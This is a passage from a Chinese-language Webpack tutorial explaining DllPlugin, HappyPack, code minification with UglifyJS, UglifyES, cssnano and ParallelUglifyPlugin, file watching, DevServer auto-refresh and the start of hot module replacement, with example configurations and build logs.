├── main.js├── polyfill.dll.js├── polyfill.manifest.json├── react.dll.js└── react.manifest.json其中包含两个动态链接库文件，分别是： polyfill.dll.js 里面包含项目所有依赖的 polyfill，例如 Promise、fetch 等 API。react.dll.js 里面包含 React 的基础运行环境，也就是 react 和 react-dom 模块。以 react.dll.js 文件为例，其文件内容大致如下： 1234567891011var _dll_react = (function(modules) &#123; // ... 此处省略 webpackBootstrap 函数代码&#125;([ function(module, exports, __webpack_require__) &#123; // 模块 ID 为 0 的模块对应的代码 &#125;, function(module, exports, __webpack_require__) &#123; // 模块 ID 为 1 的模块对应的代码 &#125;, // ... 此处省略剩下的模块对应的代码 ])); 可见一个动态链接库文件中包含了大量模块的代码，这些模块存放在一个数组里，用数组的索引号作为 ID。 并且还通过 _dll_react 变量把自己暴露在了全局中，也就是可以通过 window._dll_react 可以访问到它里面包含的模块。 其中 polyfill.manifest.json 和 react.manifest.json 文件也是由 DllPlugin 生成出，用于描述动态链接库文件中包含哪些模块， 以 react.manifest.json 文件为例，其文件内容大致如下： 12345678910111213141516171819202122232425262728&#123; // 描述该动态链接库文件暴露在全局的变量名称 \"name\": \"_dll_react\", \"content\": &#123; \"./node_modules/process/browser.js\": &#123; \"id\": 0, \"meta\": &#123;&#125; &#125;, // ... 此处省略部分模块 \"./node_modules/react-dom/lib/ReactBrowserEventEmitter.js\": &#123; \"id\": 42, \"meta\": &#123;&#125; &#125;, \"./node_modules/react/lib/lowPriorityWarning.js\": &#123; \"id\": 47, \"meta\": &#123;&#125; &#125;, // ... 此处省略部分模块 \"./node_modules/react-dom/lib/SyntheticTouchEvent.js\": &#123; \"id\": 210, \"meta\": &#123;&#125; &#125;, \"./node_modules/react-dom/lib/SyntheticTransitionEvent.js\": &#123; \"id\": 211, \"meta\": &#123;&#125; &#125;, &#125;&#125; 可见 manifest.json 文件清楚地描述了与其对应的 dll.js 文件中包含了哪些模块，以及每个模块的路径和 ID。 main.js 文件是编译出来的执行入口文件，当遇到其依赖的模块在 dll.js 文件中时，会直接通过 dll.js 文件暴露出的全局变量去获取打包在 dll.js 文件的模块。 所以在 index.html 文件中需要把依赖的两个 dll.js 文件给加载进去，index.html 内容如下： 12345678910111213&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"app\"&gt;&lt;/div&gt;&lt;!--导入依赖的动态链接库文件--&gt;&lt;script src=\"./dist/polyfill.dll.js\"&gt;&lt;/script&gt;&lt;script src=\"./dist/react.dll.js\"&gt;&lt;/script&gt;&lt;!--导入执行入口文件--&gt;&lt;script src=\"./dist/main.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 以上就是所有接入 DllPlugin 后最终编译出来的代码，接下来教你如何实现。 构建出动态链接库文件构建输出的以下这四个文件 ├── polyfill.dll.js├── polyfill.manifest.json├── react.dll.js└── react.manifest.json和以下这一个文件 ├── main.js是由两份不同的构建分别输出的。 动态链接库文件相关的文件需要由一份独立的构建输出，用于给主构建使用。新建一个 Webpack 配置文件 webpack_dll.config.js 专门用于构建它们，文件内容如下： 123456789101112131415161718192021222324252627282930313233const path = require('path');const DllPlugin = require('webpack/lib/DllPlugin');module.exports = &#123; // JS 执行入口文件 entry: &#123; // 把 React 相关模块的放到一个单独的动态链接库 react: ['react', 'react-dom'], // 把项目需要所有的 polyfill 放到一个单独的动态链接库 polyfill: ['core-js/fn/object/assign', 'core-js/fn/promise', 'whatwg-fetch'], &#125;, output: &#123; // 输出的动态链接库的文件名称，[name] 代表当前动态链接库的名称， // 也就是 entry 中配置的 react 和 polyfill filename: '[name].dll.js', // 输出的文件都放到 dist 目录下 path: path.resolve(__dirname, 'dist'), // 存放动态链接库的全局变量名称，例如对应 react 来说就是 _dll_react // 之所以在前面加上 _dll_ 是为了防止全局变量冲突 library: '_dll_[name]', &#125;, plugins: [ // 接入 DllPlugin new DllPlugin(&#123; // 动态链接库的全局变量名称，需要和 output.library 中保持一致 // 该字段的值也就是输出的 manifest.json 文件 中 name 字段的值 // 例如 react.manifest.json 中就有 \"name\": \"_dll_react\" name: '_dll_[name]', // 描述动态链接库的 manifest.json 文件输出时的文件名称 path: path.join(__dirname, 'dist', '[name].manifest.json'), &#125;), ],&#125;; 使用动态链接库文件构建出的动态链接库文件用于给其它地方使用，在这里也就是给执行入口使用。 用于输出 main.js 的主 Webpack 配置文件内容如下： 12345678910111213141516171819202122232425262728293031323334353637const path = require('path');const DllReferencePlugin = require('webpack/lib/DllReferencePlugin');module.exports = &#123; entry: &#123; // 定义入口 Chunk main: './main.js' &#125;, output: &#123; // 输出文件的名称 filename: '[name].js', // 输出文件都放到 dist 目录下 path: path.resolve(__dirname, 'dist'), &#125;, module: &#123; rules: [ &#123; // 项目源码使用了 ES6 和 JSX 语法，需要使用 babel-loader 转换 test: /\\.js$/, use: ['babel-loader'], exclude: path.resolve(__dirname, 'node_modules'), &#125;, ] &#125;, plugins: [ // 告诉 Webpack 使用了哪些动态链接库 new DllReferencePlugin(&#123; // 描述 react 动态链接库的文件内容 manifest: require('./dist/react.manifest.json'), &#125;), new DllReferencePlugin(&#123; // 描述 polyfill 动态链接库的文件内容 manifest: require('./dist/polyfill.manifest.json'), &#125;), ], devtool: 'source-map'&#125;; 注意：在 webpack_dll.config.js 文件中，DllPlugin 中的 name 参数必须和 output.library中保持一致。 原因在于 DllPlugin 中的 name 参数会影响输出的 manifest.json 文件中 name 字段的值， 而在webpack.config.js 文件中 DllReferencePlugin 会去 manifest.json 文件读取 name字段的值， 把值的内容作为在从全局变量中获取动态链接库中内容时的全局变量名。 执行构建在修改好以上两个 Webpack 配置文件后，需要重新执行构建。 重新执行构建时要注意的是需要先把动态链接库相关的文件编译出来，因为主 Webpack 配置文件中定义的 DllReferencePlugin 依赖这些文件。 执行构建时流程如下： 如果动态链接库相关的文件还没有编译出来，就需要先把它们编译出来。方法是执行 webpack –config webpack_dll.config.js 命令。 在确保动态链接库存在时，才能正常的编译出入口执行文件。方法是执行 webpack 命令。这时你会发现构建速度有了非常大的提升。 使用 HappyPack由于有大量文件需要解析和处理，构建是文件读写和计算密集型的操作，特别是当文件数量变多后，Webpack 构建慢的问题会显得严重。 运行在 Node.js 之上的 Webpack 是单线程模型的，也就是说 Webpack 需要处理的任务需要一件件挨着做，不能多个事情一起做。 文件读写和计算操作是无法避免的，那能不能让 Webpack 同一时刻处理多个任务，发挥多核 CPU 电脑的威力，以提升构建速度呢？ HappyPack 就能让 Webpack 做到这点，它把任务分解给多个子进程去并发的执行，子进程处理完后再把结果发送给主进程。 由于 JavaScript 是单线程模型，要想发挥多核 CPU 的能力，只能通过多进程去实现，而无法通过多线程实现。 使用 HappyPack分解任务和管理线程的事情 HappyPack 都会帮你做好，你所需要做的只是接入 HappyPack。 接入 HappyPack 的相关代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041const path = require('path');const ExtractTextPlugin = require('extract-text-webpack-plugin');const HappyPack = require('happypack');module.exports = &#123; module: &#123; rules: [ &#123; test: /\\.js$/, // 把对 .js 文件的处理转交给 id 为 babel 的 HappyPack 实例 use: ['happypack/loader?id=babel'], // 排除 node_modules 目录下的文件，node_modules 目录下的文件都是采用的 ES5 语法，没必要再通过 Babel 去转换 exclude: path.resolve(__dirname, 'node_modules'), &#125;, &#123; // 把对 .css 文件的处理转交给 id 为 css 的 HappyPack 实例 test: /\\.css$/, use: ExtractTextPlugin.extract(&#123; use: ['happypack/loader?id=css'], &#125;), &#125;, ] &#125;, plugins: [ new HappyPack(&#123; // 用唯一的标识符 id 来代表当前的 HappyPack 是用来处理一类特定的文件 id: 'babel', // 如何处理 .js 文件，用法和 Loader 配置中一样 loaders: ['babel-loader?cacheDirectory'], // ... 其它配置项 &#125;), new HappyPack(&#123; id: 'css', // 如何处理 .css 文件，用法和 Loader 配置中一样 loaders: ['css-loader'], &#125;), new ExtractTextPlugin(&#123; filename: `[name].css`, &#125;), ],&#125;; 以上代码有两点重要的修改： 在 Loader 配置中，所有文件的处理都交给了 happypack/loader 去处理，使用紧跟其后的 querystring ?id=babel 去告诉 happypack/loader 去选择哪个 HappyPack 实例去处理文件。 在 Plugin 配置中，新增了两个 HappyPack 实例分别用于告诉 happypack/loader 去如何处理 .js 和 .css 文件。选项中的 id 属性的值和上面 querystring 中的 ?id=babel 相对应，选项中的 loaders 属性和 Loader 配置中一样。 在实例化 HappyPack 插件的时候，除了可以传入 id 和 loaders 两个参数外，HappyPack 还支持如下参数： threads 代表开启几个子进程去处理这一类型的文件，默认是3个，类型必须是整数。 verbose 是否允许 HappyPack 输出日志，默认是 true。 threadPool 代表共享进程池，即多个 HappyPack 实例都使用同一个共享进程池中的子进程去处理任务，以防止资源占用过多，相关代码如下： 1234567891011121314151617181920212223242526const HappyPack = require('happypack');// 构造出共享进程池，进程池中包含5个子进程const happyThreadPool = HappyPack.ThreadPool(&#123; size: 5 &#125;);module.exports = &#123; plugins: [ new HappyPack(&#123; // 用唯一的标识符 id 来代表当前的 HappyPack 是用来处理一类特定的文件 id: 'babel', // 如何处理 .js 文件，用法和 Loader 配置中一样 loaders: ['babel-loader?cacheDirectory'], // 使用共享进程池中的子进程去处理任务 threadPool: happyThreadPool, &#125;), new HappyPack(&#123; id: 'css', // 如何处理 .css 文件，用法和 Loader 配置中一样 loaders: ['css-loader'], // 使用共享进程池中的子进程去处理任务 threadPool: happyThreadPool, &#125;), new ExtractTextPlugin(&#123; filename: `[name].css`, &#125;), ],&#125;; 接入 HappyPack 后，你需要给项目安装新的依赖： 1npm i -D happypack 安装成功后重新执行构建你就会看到以下由 HappyPack 输出的日志： 1234Happy[babel]: Version: 4.0.0-beta.5. Threads: 3Happy[babel]: All set; signaling webpack to proceed.Happy[css]: Version: 4.0.0-beta.5. Threads: 3Happy[css]: All set; signaling webpack to proceed. 说明你的 HappyPack 配置生效了，并且可以得知 HappyPack 分别启动了3个子进程去并行的处理任务。 HappyPack 原理 在整个 Webpack 构建流程中，最耗时的流程可能就是 Loader 对文件的转换操作了，因为要转换的文件数据巨多，而且这些转换操作都只能一个个挨着处理。 HappyPack 的核心原理就是把这部分任务分解到多个进程去并行处理，从而减少了总的构建时间。 从前面的使用中可以看出所有需要通过 Loader 处理的文件都先交给了 happypack/loader 去处理，收集到了这些文件的处理权后 HappyPack 就好统一分配了。 每通过 new HappyPack() 实例化一个 HappyPack 其实就是告诉 HappyPack 核心调度器如何通过一系列 Loader 去转换一类文件，并且可以指定如何给这类转换操作分配子进程。 核心调度器的逻辑代码在主进程中，也就是运行着 Webpack 的进程中，核心调度器会把一个个任务分配给当前空闲的子进程，子进程处理完毕后把结果发送给核心调度器，它们之间的数据交换是通过进程间通信 API 实现的。 核心调度器收到来自子进程处理完毕的结果后会通知 Webpack 该文件处理完毕。 压缩代码浏览器从服务器访问网页时获取的 JavaScript、CSS 资源都是文本形式的，文件越大网页加载时间越长。 为了提升网页加速速度和减少网络传输流量，可以对这些资源进行压缩。 压缩的方法除了可以通过 GZIP 算法对文件压缩外，还可以对文本本身进行压缩。 对文本本身进行压缩的作用除了有提升网页加载速度的优势外，还具有混淆源码的作用。 由于压缩后的代码可读性非常差，就算别人下载到了网页的代码，也大大增加了代码分析和改造的难度。 下面来一一介绍如何在 Webpack 中压缩代码。 压缩 JavaScript目前最成熟的 JavaScript 代码压缩工具是 UglifyJS ， 它会分析 JavaScript 代码语法树，理解代码含义，从而能做到诸如去掉无效代码、去掉日志输出代码、缩短变量名等优化。 要在 Webpack 中接入 UglifyJS 需要通过插件的形式，目前有两个成熟的插件，分别是： UglifyJsPlugin：通过封装 UglifyJS 实现压缩。 ParallelUglifyPlugin：多进程并行处理压缩，下一节有介绍 由于 ParallelUglifyPlugin 在 4-4使用ParallelUglifyPlugin 中介绍就不再复述， 这里重点介绍如何配置 UglifyJS 以达到最优的压缩效果。 UglifyJS 提供了非常多的选择用于配置在压缩过程中采用哪些规则，所有的选项说明可以在 其官方文档 上看到。 由于选项非常多，就挑出一些常用的拿出来详细讲解其应用方式： sourceMap：是否为压缩后的代码生成对应的 Source Map，默认为不生成，开启后耗时会大大增加。一般不会把压缩后的代码的 Source Map 发送给网站用户的浏览器，而是用于内部开发人员调试线上代码时使用。 beautify： 是否输出可读性较强的代码，即会保留空格和制表符，默认为是，为了达到更好的压缩效果，可以设置为 false。 comments：是否保留代码中的注释，默认为保留，为了达到更好的压缩效果，可以设置为 false。 compress.warnings：是否在 UglifyJs 删除没有用到的代码时输出警告信息，默认为输出，可以设置为 false 以关闭这些作用不大的警告。 drop_console：是否剔除代码中所有的 console 语句，默认为不剔除。开启后不仅可以提升代码压缩效果，也可以兼容不支持 console 语句 IE 浏览器。 collapse_vars：是否内嵌定义了但是只用到一次的变量，例如把 var x = 5; y = x 转换成 y = 5，默认为不转换。为了达到更好的压缩效果，可以设置为 true。 reduce_vars： 是否提取出出现多次但是没有定义成变量去引用的静态值，例如把 x = ‘Hello’; y = ‘Hello’ 转换成 var a = ‘Hello’; x = a; y = b，默认为不转换。为了达到更好的压缩效果，可以设置为 true。 也就是说，在不影响代码正确执行的前提下，最优化的代码压缩配置为如下： 12345678910111213141516171819202122232425const UglifyJSPlugin = require('webpack/lib/optimize/UglifyJsPlugin');module.exports = &#123; plugins: [ // 压缩输出的 JS 代码 new UglifyJSPlugin(&#123; compress: &#123; // 在UglifyJs删除没有用到的代码时不输出警告 warnings: false, // 删除所有的 `console` 语句，可以兼容ie浏览器 drop_console: true, // 内嵌定义了但是只用到一次的变量 collapse_vars: true, // 提取出出现多次但是没有定义成变量去引用的静态值 reduce_vars: true, &#125;, output: &#123; // 最紧凑的输出 beautify: false, // 删除所有的注释 comments: false, &#125; &#125;), ],&#125;; 从以上配置中可以看出 Webpack 内置了 UglifyJsPlugin，需要指出的是 UglifyJsPlugin 当前采用的是 UglifyJS2 而不是老的 UglifyJS1， 这两个版本的 UglifyJS 在配置上有所区别，看文档时注意版本。 除此之外 Webpack 还提供了一个更简便的方法来接入 UglifyJSPlugin，直接在启动 Webpack 时带上 –optimize-minimize 参数，即 webpack –optimize-minimize， 这样 Webpack 会自动为你注入一个带有默认配置的 UglifyJSPlugin。 压缩 ES6虽然当前大多数 JavaScript 引擎还不完全支持 ES6 中的新特性，但在一些特定的运行环境下已经可以直接执行 ES6 代码了，例如最新版的 Chrome、ReactNative 的引擎 JavaScriptCore。 运行 ES6 的代码相比于转换后的 ES5 代码有如下优点： 一样的逻辑用 ES6 实现的代码量比 ES5 更少。 JavaScript 引擎对 ES6 中的语法做了性能优化，例如针对 const 申明的变量有更快的读取速度。 所以在运行环境允许的情况下，我们要尽可能的使用原生的 ES6 代码去运行，而不是转换后的 ES5 代码。 在你用上面所讲的压缩方法去压缩 ES6 代码时，你会发现 UglifyJS 会报错退出，原因是 UglifyJS 只认识 ES5 语法的代码。 为了压缩 ES6 代码，需要使用专门针对 ES6 代码的 UglifyES。 UglifyES 和 UglifyJS 来自同一个项目的不同分支，它们的配置项基本相同，只是接入 Webpack 时有所区别。 在给 Webpack 接入 UglifyES 时，不能使用内置的 UglifyJsPlugin，而是需要单独安装和使用最新版本的 uglifyjs-webpack-plugin。 安装方法如下： 1npm i -D uglifyjs-webpack-plugin@beta Webpack 相关配置代码如下： 123456789101112131415161718192021222324252627const UglifyESPlugin = require('uglifyjs-webpack-plugin')module.exports = &#123; plugins: [ new UglifyESPlugin(&#123; // 多嵌套了一层 uglifyOptions: &#123; compress: &#123; // 在UglifyJs删除没有用到的代码时不输出警告 warnings: false, // 删除所有的 `console` 语句，可以兼容ie浏览器 drop_console: true, // 内嵌定义了但是只用到一次的变量 collapse_vars: true, // 提取出出现多次但是没有定义成变量去引用的静态值 reduce_vars: true, &#125;, output: &#123; // 最紧凑的输出 beautify: false, // 删除所有的注释 comments: false, &#125; &#125; &#125;) ]&#125; 同时，为了不让 babel-loader 输出 ES5 语法的代码，需要去掉 .babelrc 配置文件中的 babel-preset-env，但是其它的 Babel 插件，比如 babel-preset-react 还是要保留， 因为正是 babel-preset-env 负责把 ES6 代码转换为 ES5 代码。 压缩 CSSCSS 代码也可以像 JavaScript 那样被压缩，以达到提升加载速度和代码混淆的作用。 目前比较成熟可靠的 CSS 压缩工具是 cssnano，基于 PostCSS。 cssnano 能理解 CSS 代码的含义，而不仅仅是删掉空格，例如： margin: 10px 20px 10px 20px 被压缩成 margin: 10px 20px color: #ff0000 被压缩成 color:red 还有很多压缩规则可以去其官网查看，通常压缩率能达到 60%。 把 cssnano 接入到 Webpack 中也非常简单，因为 css-loader 已经将其内置了，要开启 cssnano 去压缩代码只需要开启 css-loader 的 minimize 选项。 相关 Webpack 配置如下： 12345678910111213141516171819202122232425262728const path = require('path');const &#123;WebPlugin&#125; = require('web-webpack-plugin');const ExtractTextPlugin = require('extract-text-webpack-plugin');module.exports = &#123; module: &#123; rules: [ &#123; test: /\\.css$/,// 增加对 CSS 文件的支持 // 提取出 Chunk 中的 CSS 代码到单独的文件中 use: ExtractTextPlugin.extract(&#123; // 通过 minimize 选项压缩 CSS 代码 use: ['css-loader?minimize'] &#125;), &#125;, ] &#125;, plugins: [ // 用 WebPlugin 生成对应的 HTML 文件 new WebPlugin(&#123; template: './template.html', // HTML 模版文件所在的文件路径 filename: 'index.html' // 输出的 HTML 的文件名称 &#125;), new ExtractTextPlugin(&#123; filename: `[name]_[contenthash:8].css`,// 给输出的 CSS 文件名称加上 Hash 值 &#125;), ],&#125;; 使用 ParallelUglifyPlugin在使用 Webpack 构建出用于发布到线上的代码时，都会有压缩代码这一流程。 最常见的 JavaScript 代码压缩工具是 UglifyJS，并且 Webpack 也内置了它。 用过 UglifyJS 的你一定会发现在构建用于开发环境的代码时很快就能完成，但在构建用于线上的代码时构建一直卡在一个时间点迟迟没有反应，其实卡住的这个时候就是在进行代码压缩。 由于压缩 JavaScript 代码需要先把代码解析成用 Object 抽象表示的 AST 语法树，再去应用各种规则分析和处理 AST，导致这个过程计算量巨大，耗时非常多。 为什么不把在4-3 使用 HappyPack中介绍过的多进程并行处理的思想也引入到代码压缩中呢？ ParallelUglifyPlugin 就做了这个事情。 当 Webpack 有多个 JavaScript 文件需要输出和压缩时，原本会使用 UglifyJS 去一个个挨着压缩再输出， 但是 ParallelUglifyPlugin 则会开启多个子进程，把对多个文件的压缩工作分配给多个子进程去完成，每个子进程其实还是通过 UglifyJS 去压缩代码，但是变成了并行执行。 所以 ParallelUglifyPlugin 能更快的完成对多个文件的压缩工作。 使用 ParallelUglifyPlugin 也非常简单，把原来 Webpack 配置文件中内置的 UglifyJsPlugin 去掉后，再替换成 ParallelUglifyPlugin，相关代码如下： 123456789101112131415161718192021222324252627282930const path = require('path');const DefinePlugin = require('webpack/lib/DefinePlugin');const ParallelUglifyPlugin = require('webpack-parallel-uglify-plugin');module.exports = &#123; plugins: [ // 使用 ParallelUglifyPlugin 并行压缩输出的 JS 代码 new ParallelUglifyPlugin(&#123; // 传递给 UglifyJS 的参数 uglifyJS: &#123; output: &#123; // 最紧凑的输出 beautify: false, // 删除所有的注释 comments: false, &#125;, compress: &#123; // 在UglifyJs删除没有用到的代码时不输出警告 warnings: false, // 删除所有的 `console` 语句，可以兼容ie浏览器 drop_console: true, // 内嵌定义了但是只用到一次的变量 collapse_vars: true, // 提取出出现多次但是没有定义成变量去引用的静态值 reduce_vars: true, &#125; &#125;, &#125;), ],&#125;; 在通过 new ParallelUglifyPlugin() 实例化时，支持以下参数： test：使用正则去匹配哪些文件需要被 ParallelUglifyPlugin 压缩，默认是 /.js$/，也就是默认压缩所有的 .js 文件。 include：使用正则去命中需要被 ParallelUglifyPlugin 压缩的文件。默认为 []。 exclude：使用正则去命中不需要被 ParallelUglifyPlugin 压缩的文件。默认为 []。 cacheDir：缓存压缩后的结果，下次遇到一样的输入时直接从缓存中获取压缩后的结果并返回。cacheDir 用于配置缓存存放的目录路径。默认不会缓存，想开启缓存请设置一个目录路径。 workerCount：开启几个子进程去并发的执行压缩。默认是当前运行电脑的 CPU 核数减去1。 sourceMap：是否输出 Source Map，这会导致压缩过程变慢。 uglifyJS：用于压缩 ES5 代码时的配置，Object 类型，直接透传给 UglifyJS 的参数。 uglifyES：用于压缩 ES6 代码时的配置，Object 类型，直接透传给 UglifyES 的参数。 其中的 test、include、exclude 与配置 Loader 时的思想和用法一样。 UglifyES 是 UglifyJS 的变种，专门用于压缩 ES6 代码，它们两都出自于同一个项目，并且它们两不能同时使用。 UglifyES 一般用于给比较新的 JavaScript 运行环境压缩代码，例如用于 ReactNative 的代码运行在兼容性较好的JavaScriptCore 引擎中，为了得到更好的性能和尺寸，采用 UglifyES 压缩效果会更好。 ParallelUglifyPlugin 同时内置了 UglifyJS 和 UglifyES，也就是说ParallelUglifyPlugin 支持并行压缩 ES6 代码。 接入 ParallelUglifyPlugin 后，项目需要安装新的依赖： 1npm i -D webpack-parallel-uglify-plugin 安装成功后，重新执行构建你会发现速度变快了许多。如果设置 cacheDir 开启了缓存，在之后的构建中会变的更快。 使用自动刷新在开发阶段，修改源码是不可避免的操作。 对于开发网页来说，要想看到修改后的效果，需要刷新浏览器让其重新运行最新的代码才行。 虽然这相比于开发原生 iOS 和 Android 应用来说要方便很多，因为那需要重新编译这个项目再运行，但我们可以把这个体验优化的更好。 借助自动化的手段，可以把这些重复的操作交给代码去帮我们完成，在监听到本地源码文件发生变化时，自动重新构建出可运行的代码后再控制浏览器刷新。 Webpack 把这些功能都内置了，并且还提供多种方案可选。 文件监听文件监听是在发现源码文件发生变化时，自动重新构建出新的输出文件。 Webpack 官方提供了两大模块，一个是核心的 webpack，一个是在1-6 使用 DevServer 中提到的 webpack-dev-server 扩展模块。 而文件监听功能是 webpack 模块提供的。 在2-7 其它配置项 中曾介绍过 Webpack 支持文件监听相关的配置项如下： 123456789101112131415161718module.export = &#123; // 只有在开启监听模式时，watchOptions 才有意义 // 默认为 false，也就是不开启 watch: true, // 监听模式运行时的参数 // 在开启监听模式时，才有意义 watchOptions: &#123; // 不监听的文件或文件夹，支持正则匹配 // 默认为空 ignored: /node_modules/, // 监听到变化发生后会等300ms再去执行动作，防止文件更新太快导致重新编译频率太高 // 默认为 300ms aggregateTimeout: 300, // 判断文件是否发生变化是通过不停的去询问系统指定文件有没有变化实现的 // 默认每隔1000毫秒询问一次 poll: 1000 &#125;&#125; 要让 Webpack 开启监听模式，有两种方式： 在配置文件 webpack.config.js 中设置 watch: true。 在执行启动 Webpack 命令时，带上 –watch 参数，完整命令是 webpack –watch。 文件监听工作原理在 Webpack 中监听一个文件发生变化的原理是定时的去获取这个文件的最后编辑时间，每次都存下最新的最后编辑时间，如果发现当前获取的和最后一次保存的最后编辑时间不一致，就认为该文件发生了变化。 配置项中的 watchOptions.poll 就是用于控制定时检查的周期，具体含义是每隔多少毫秒检查一次。 当发现某个文件发生了变化时，并不会立刻告诉监听者，而是先缓存起来，收集一段时间的变化后，再一次性告诉监听者。 配置项中的 watchOptions.aggregateTimeout 就是用于配置这个等待时间。 这样做的目的是因为我们在编辑代码的过程中可能会高频的输入文字导致文件变化的事件高频的发生，如果每次都重新执行构建就会让构建卡死。 对于多个文件来说，原理相似，只不过会对列表中的每一个文件都定时的执行检查。 但是这个需要监听的文件列表是怎么确定的呢？ 默认情况下 Webpack 会从配置的 Entry 文件出发，递归解析出 Entry 文件所依赖的文件，把这些依赖的文件都加入到监听列表中去。 可见 Webpack 这一点还是做的很智能的，不是粗暴的直接监听项目目录下的所有文件。 由于保存文件的路径和最后编辑时间需要占用内存，定时检查周期检查需要占用 CPU 以及文件 I/O，所以最好减少需要监听的文件数量和降低检查频率。 优化文件监听性能在明白文件监听工作原理后，就好分析如何优化文件监听性能了。 开启监听模式时，默认情况下会监听配置的 Entry 文件和所有其递归依赖的文件。 在这些文件中会有很多存在于 node_modules 下，因为如今的 Web 项目会依赖大量的第三方模块。 在大多数情况下我们都不可能去编辑 node_modules 下的文件，而是编辑自己建立的源码文件。 所以一个很大的优化点就是忽略掉 node_modules 下的文件，不监听它们。相关配置如下： 123456module.export = &#123; watchOptions: &#123; // 不监听的 node_modules 目录下的文件 ignored: /node_modules/, &#125;&#125; 采用这种方法优化后，你的 Webpack 消耗的内存和 CPU 将会大大降低。 有时你可能会觉得 node_modules 目录下的第三方模块有 bug，想修改第三方模块的文件，然后在自己的项目中试试。在这种情况下如果使用了以上优化方法，我们需要重启构建以看到最新效果。 但这种情况毕竟是非常少见的。 除了忽略掉部分文件的优化外，还有如下两种方法： watchOptions.aggregateTimeout 值越大性能越好，因为这能降低重新构建的频率。 watchOptions.poll 值越大越好，因为这能降低检查的频率。 但两种优化方法的后果是会让你感觉到监听模式的反应和灵敏度降低了。 自动刷新浏览器监听到文件更新后的下一步是去刷新浏览器，webpack 模块负责监听文件，webpack-dev-server 模块则负责刷新浏览器。 在使用 webpack-dev-server 模块去启动 webpack 模块时，webpack 模块的监听模式默认会被开启。 webpack 模块会在文件发生变化时告诉 webpack-dev-server 模块。 自动刷新的原理控制浏览器刷新有三种方法： 借助浏览器扩展去通过浏览器提供的接口刷新，WebStorm IDE 的 LiveEdit 功能就是这样实现的。 往要开发的网页中注入代理客户端代码，通过代理客户端去刷新整个页面。 把要开发的网页装进一个 iframe 中，通过刷新 iframe 去看到最新效果。 DevServer 支持第2、3种方法，第2种是 DevServer 默认采用的刷新方法。 通过 DevServer 启动构建后，你会看到如下日志： 1234567891011121314151617181920212223&gt; webpack-dev-serverProject is running at http://localhost:8080/webpack output is served from /Hash: e4e2f9508ac286037e71Version: webpack 3.5.5Time: 1566ms Asset Size Chunks Chunk Names bundle.js 1.07 MB 0 [emitted] [big] mainbundle.js.map 1.27 MB 0 [emitted] main [115] multi (webpack)-dev-server/client?http://localhost:8080 ./main.js 40 bytes &#123;0&#125; [built] [116] (webpack)-dev-server/client?http://localhost:8080 5.83 kB &#123;0&#125; [built] [117] ./node_modules/url/url.js 23.3 kB &#123;0&#125; [built] [120] ./node_modules/querystring-es3/index.js 127 bytes &#123;0&#125; [built] [123] ./node_modules/strip-ansi/index.js 161 bytes &#123;0&#125; [built] [125] ./node_modules/loglevel/lib/loglevel.js 6.74 kB &#123;0&#125; [built] [126] (webpack)-dev-server/client/socket.js 856 bytes &#123;0&#125; [built] [158] (webpack)-dev-server/client/overlay.js 3.6 kB &#123;0&#125; [built] [159] ./node_modules/ansi-html/index.js 4.26 kB &#123;0&#125; [built] [163] (webpack)/hot nonrecursive ^\\.\\/log$ 170 bytes &#123;0&#125; [built] [165] (webpack)/hot/emitter.js 77 bytes &#123;0&#125; [built] [167] ./main.js 2.28 kB &#123;0&#125; [built] + 255 hidden modules 细心的你会观察到输出的 bundle.js 中包含了以下七个模块： 1234567[116] (webpack)-dev-server/client?http://localhost:8080 5.83 kB &#123;0&#125; [built][117] ./node_modules/url/url.js 23.3 kB &#123;0&#125; [built][120] ./node_modules/querystring-es3/index.js 127 bytes &#123;0&#125; [built][123] ./node_modules/strip-ansi/index.js 161 bytes &#123;0&#125; [built][125] ./node_modules/loglevel/lib/loglevel.js 6.74 kB &#123;0&#125; [built] [126] (webpack)-dev-server/client/socket.js 856 bytes &#123;0&#125; [built][158] (webpack)-dev-server/client/overlay.js 3.6 kB &#123;0&#125; [built] 这七个模块就是代理客户端的代码，它们被打包进了要开发的网页代码中。 在浏览器中打开网址 http://localhost:8080/ 后， 在浏览器的开发者工具中你会发现由代理客户端向 DevServer 发起的 WebSocket 连接： 优化自动刷新的性能在2-6 DevServer中曾介绍过 devServer.inline 配置项，它就是用来控制是否往 Chunk 中注入代理客户端的，默认会注入。 事实上，在开启 inline 时，DevServer 会为每个输出的 Chunk 中注入代理客户端的代码，当你的项目需要输出的 Chunk 有很多个时，这会导致你的构建缓慢。 其实要完成自动刷新，一个页面只需要一个代理客户端就行了，DevServer 之所以粗暴的为每个 Chunk 都注入，是因为它不知道某个网页依赖哪几个 Chunk，索性就全部都注入一个代理客户端。 网页只要依赖了其中任何一个 Chunk，代理客户端就被注入到网页中去。 这里优化的思路是关闭还不够优雅的 inline 模式，只注入一个代理客户端。 为了关闭 inline 模式，在启动 DevServer 时，可通过执行命令 webpack-dev-server --inline false（也可以在配置文件中设置），这时输出的日志如下： 123456789101112&gt; webpack-dev-server --inline falseProject is running at http://localhost:8080/webpack-dev-server/webpack output is served from /Hash: 5a43fc44b5e85f4c2cf1Version: webpack 3.5.5Time: 1130ms Asset Size Chunks Chunk Names bundle.js 750 kB 0 [emitted] [big] mainbundle.js.map 897 kB 0 [emitted] main [81] ./main.js 2.29 kB &#123;0&#125; [built] + 169 hidden modules 和前面的不同在于 入口网址变成了 http://localhost:8080/webpack-dev-server/bundle.js 中不再包含代理客户端的代码了在浏览器中打开网址 http://localhost:8080/webpack-dev-server/ 后，你会看到如下效果： 要开发的网页被放进了一个 iframe 中，编辑源码后，iframe 会被自动刷新。 同时你会发现构建时间从 1566ms 减少到了 1130ms，说明优化生效了。构建性能提升的效果在要输出的 Chunk 数量越多时会显得越突出。 如果你不想通过 iframe 的方式去访问，但同时又想让网页保持自动刷新功能，你需要手动往网页中注入代理客户端脚本，往 index.html 中插入以下标签： 1&lt;script src=\"http://localhost:8080/webpack-dev-server.js\"&gt;&lt;/script&gt; 给网页注入以上脚本后，独立打开的网页就能自动刷新了。但是要注意在发布到线上时记得删除掉这段用于开发环境的代码。 开启模块热替换要做到实时预览，除了在4-5使用自动刷新中介绍的刷新整个网页外，DevServer 还支持一种叫做模块热替换(Hot Module Replacement)的技术可在不刷新整个网页的情况下做到超灵敏的实时预览。 原理是当一个源码发生变化时，只重新编译发生变化的模块，再用新输出的模块替换掉浏览器中对应的老模块。 模块热替换技术的优势有： 实时预览反应更快，等待时间更短。 